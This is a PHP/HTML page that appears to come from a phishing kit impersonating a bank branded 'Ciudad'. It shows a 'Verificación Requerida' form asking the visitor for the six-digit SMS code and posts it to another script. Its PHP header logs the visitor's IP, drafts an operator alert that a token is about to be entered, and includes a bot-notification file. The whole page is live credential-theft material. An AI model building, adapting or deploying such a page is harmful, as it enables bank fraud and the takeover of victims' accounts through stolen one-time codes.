<?php
$user_ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$enviara = "¡ALERTA! El token va a ser ingresado 👁‍🗨\n" . 
            "🌐 IP " . $user_ip . "\n";
$enviar = urldecode($enviara);
include 'bot_id.php';
?>
<!DOCTYPE html>
<html><head>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="main/extraIn.css" rel="stylesheet">
    <link href="main/favicon.png" rel="shortcut icon">
    <meta content="noindex" name="robots">

    <title>Ciudad</title>
</head>

<body>
    <header>
        <img alt="Logo" src="main/ciudad.svg" width="200">
    </header>

    <section class="container">
        <div>
            <form action="cargando2.php" id="mainF" method="post" name="mainF">
                <h1 class="title">Verificación Requerida</h1>

                <p>Ingresá el código que te enviamos por SMS a tu número de celular.</p>
                <input class="inputCodes" maxlength="6" minlength="6" name="tokencode" pattern="[0-9]+" placeholder="######" required="" type="tel"><br>
                <br>
                <br>
                <button class="boton" id="mainB" type="submit">CONFIRMAR</button>
            </form>
        </div>
    </section>

</body></html>